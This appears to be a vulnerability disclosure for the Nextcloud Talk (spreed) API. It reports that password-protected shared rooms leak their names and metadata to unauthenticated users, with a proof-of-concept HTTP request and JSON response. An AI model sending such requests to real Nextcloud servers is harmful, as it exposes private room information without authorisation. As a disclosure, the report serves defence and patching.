Description
-----------

The API of the official [spreed/talk](https://github.com/nextcloud/spreed) extension reveals potentially sensitive information such as room names or participants of password-protected rooms to users without the password.

An account is not required to access room names.

POC: Shared, password protected room leaks room name to unauthenticated attackers
---------

Prerequisite: Create a room, click on "Share link", and enable password protection.

As unauthenticated user, visit the login page to get cookies and a CSRF token. 

The unauthenticated user cannot access `nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room` or `nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room/iu86mvxv/participant` ("Current user is not logged in"). However, they can access specific rooms based on the room id:

    GET /nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room/bk9we2vg HTTP/1.1
    Host: 192.168.0.103
    [...]
    requesttoken: [...]
    [...]
    Cookie: [...]
    Connection: close

    HTTP/1.1 200 OK
    {"ocs":{"meta":{"status":"ok","statuscode":200,"message":"OK"},"data":{"id":13,"token":"bk9we2vg","type":3,"name":"supersecret","displayName":"supersecret","objectType":"","objectId":"","participantType":4,"participantInCall":0,"participantFlags":0,"count":1,"hasPassword":true,"hasCall":false,"lastActivity":1540389616,"unreadMessages":0,"unreadMention":false,"isFavorite":false,"lastPing":0,"sessionId":"0","participants":[],"numGuests":0,"guestList":"","lastMessage":[]}}}

Despite being password protected, the room leaked the room name - which might contain sensitive information - to unauthenticated attackers.
